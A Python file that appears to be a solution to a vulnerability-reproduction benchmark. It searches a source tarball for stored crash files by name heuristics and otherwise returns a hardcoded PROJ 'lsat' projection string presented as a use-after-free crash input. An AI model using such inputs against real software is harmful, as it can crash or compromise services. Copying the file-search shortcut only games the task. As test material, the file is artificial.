import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 38
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._fallback_poc()
        with tf:
            exact_member = None
            exact_score = -1
            keyword_member = None
            keyword_score = -1
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                sz = m.size
                if sz <= 0 or sz > 4096:
                    continue
                name = m.name.lower()
                if sz == target_len:
                    score = 100
                    if "poc" in name:
                        score += 50
                    if "crash" in name:
                        score += 40
                    if "id:" in name or "id_" in name:
                        score += 35
                    if "uaf" in name or "use-after-free" in name or "use_after_free" in name:
                        score += 25
                    if "lsat" in name:
                        score += 20
                    if name.endswith((".in", ".txt", ".bin", ".dat", ".raw", ".gie")):
                        score += 5
                    if score > exact_score:
                        exact_score = score
                        exact_member = m
                else:
                    score = 0
                    if "poc" in name:
                        score += 50
                    if "crash" in name:
                        score += 40
                    if "id:" in name or "id_" in name:
                        score += 35
                    if "uaf" in name or "use-after-free" in name or "use_after_free" in name:
                        score += 25
                    if "lsat" in name:
                        score += 20
                    if name.endswith((".in", ".txt", ".bin", ".dat", ".raw", ".gie")):
                        score += 5
                    diff = abs(sz - target_len)
                    if diff < 10:
                        score += 10 - diff
                    if score > keyword_score:
                        keyword_score = score
                        keyword_member = m
            if exact_member is not None:
                try:
                    fobj = tf.extractfile(exact_member)
                    if fobj is not None:
                        data = fobj.read()
                        if data:
                            return data
                except Exception:
                    pass
            if keyword_member is not None and keyword_score >= 50:
                try:
                    fobj = tf.extractfile(keyword_member)
                    if fobj is not None:
                        data = fobj.read()
                        if data:
                            return data
                except Exception:
                    pass
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        poc = "+proj=lsat +lsat=5 +path=1 +lat_1=0 +lat_2=0"
        return poc.encode("ascii", "replace")